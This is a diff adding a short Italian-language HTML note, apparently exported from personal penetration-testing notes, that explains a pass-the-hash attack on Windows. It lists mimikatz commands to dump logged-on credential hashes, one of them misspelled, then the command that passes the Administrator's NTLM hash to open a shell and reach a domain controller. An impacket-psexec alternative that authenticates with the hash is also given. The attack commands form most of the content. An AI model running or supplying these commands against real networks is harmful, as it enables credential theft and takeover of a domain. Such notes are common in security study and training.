@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Pass the hash con mimikatz</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>Pass the hash con mimikatz</h1><br/><p><em>Per eseguire l&#39;attacco è necessario essere almeno amministratori locali della macchina.</em></p><p><ol><li>1) <strong><span style="color:#071ba3;">1) Eseguiamo mimikatz;</span></strong></li></ol></p><p><ol><li>2) <strong><span style="color:#071ba3;">2) Eseguiamo:</span></strong></li></ol></p><p></p><p><span style="color:#ff0000;">privilege::debug</span></p><p></p><p>e</p><p></p><p><span style="color:#ff0000;">sekursla::logonPasswords</span></p><p></p><p><em>Il primo risultato è l&#39;hash della paswd che stiamo utilizzando, ma scendendo, potremmo trovare l&#39;hash dell&#39;Amministratore:</em></p><p></p><p><img src="images/132-1.png" alt="images/132-1.png" /></p><p><ol><li>3) <strong><span style="color:#071ba3;">3) Possiamo effettuare il pass the hash:</span></strong></li></ol></p><p></p><p><span style="color:#ff0000;">sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:HASH</span></p><p><ol><li>4) <strong><span style="color:#071ba3;">4) Si aprirà un nuovo terminale col quale possiamo accedere al DC.</span></strong></li></ol></p><p></p><p>-------------------------------------------------------------------------------------------------------------------</p><p></p><p><em>Alternativa a mimikatz → Dopo aver ottenuto l&#39;hash dell&#39;Amministratore:</em></p><p></p><p><span style="color:#ff0000;">impacket-psexec -hashes 00000000000000000000000000000000:HASH administrator@IP</span></p><p></p><p><em>(formato NT:LM, dove NT è nullo)</em></p></div>
+</body>
+</html>
